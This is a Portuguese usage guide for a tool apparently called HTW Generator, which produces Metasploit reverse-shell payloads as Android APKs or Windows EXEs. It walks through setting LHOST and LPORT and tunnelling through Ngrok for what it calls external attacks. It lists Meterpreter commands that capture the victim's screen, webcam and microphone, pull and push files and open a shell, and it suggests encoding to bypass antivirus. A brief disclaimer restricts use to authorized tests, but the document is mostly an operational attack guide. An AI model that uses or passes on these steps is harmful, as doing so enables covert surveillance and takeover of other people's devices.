Como Iniciar:

Execute o programa com o comando:
python3 htw.py

Você verá um menu colorido com as seguintes opções:

Quick Setup (configuração rápida)

Custom (configuração manual)

Sair

Modo Quick Setup (Recomendado para Iniciantes):

Selecione a opção 01

Escolha o tipo de payload:

Digite 1 para Android (gera arquivo .apk)

Digite 2 para Windows (gera arquivo .exe)

Informe um nome para o arquivo de saída (ex: payload.apk)

A ferramenta irá gerar automaticamente o payload com as configurações padrão (LHOST=localhost, LPORT=4444)

Modo Custom (Para Usos Avançados):

Selecione a opção 02

Configure manualmente:

LHOST: IP do seu servidor (para rede local use seu IP interno, para internet use Ngrok)

LPORT: Porta que será usada para a conexão

Nome do arquivo de saída

A ferramenta gerará o payload e iniciará automaticamente o listener no Metasploit

Usando com Ngrok (Para Ataques Externos):

Em um terminal separado, inicie o Ngrok com:
./ngrok tcp 4444

Anote o endereço gerado (ex: tcp://0.tcp.sa.ngrok.io:12345)

No HTW Generator:

Use o domínio do Ngrok como LHOST (0.tcp.sa.ngrok.io)

Use a porta do Ngrok como LPORT (12345)

Comandos Úteis no Meterpreter:
Após estabelecer a conexão, você pode usar:

screenshot - Captura a tela do dispositivo

webcam_snap - Tira foto pela webcam

record_mic - Grava áudio do microfone

download - Baixa arquivos do alvo

upload - Envia arquivos para o alvo

shell - Acessa o terminal do dispositivo

Importante:

Esta ferramenta deve ser usada apenas para testes de segurança autorizados

Mantenha o Ngrok rodando enquanto estiver esperando a conexão

Para bypass de antivírus, considere usar técnicas de encoding ou embedding

Suporte:
Para dúvidas ou problemas, consulte:

GitHub: github.com/CipherShadow082

Telegram: t.me/CipherShadow08
